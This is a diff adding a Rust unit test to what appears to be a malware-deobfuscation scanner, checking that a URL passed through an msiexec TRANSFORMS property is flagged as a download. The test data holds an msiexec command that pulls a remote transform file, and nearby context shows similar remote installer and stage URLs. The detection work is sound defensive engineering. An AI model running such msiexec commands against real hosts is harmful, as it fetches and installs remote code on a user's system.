@@ -36618,6 +36618,27 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn msiexec_non_logging_property_url_stays_visible() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"msiexec /i local.msi TRANSFORMS=https://msiexec-transform-deob.example/a.mst"#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://msiexec-transform-deob.example/a.mst"
+                )
+            }),
+            "msiexec non-logging property URL should stay visible: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn msiexec_attached_install_url_in_deob_text_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://msiexec-attached-deob.example/setup.msi";
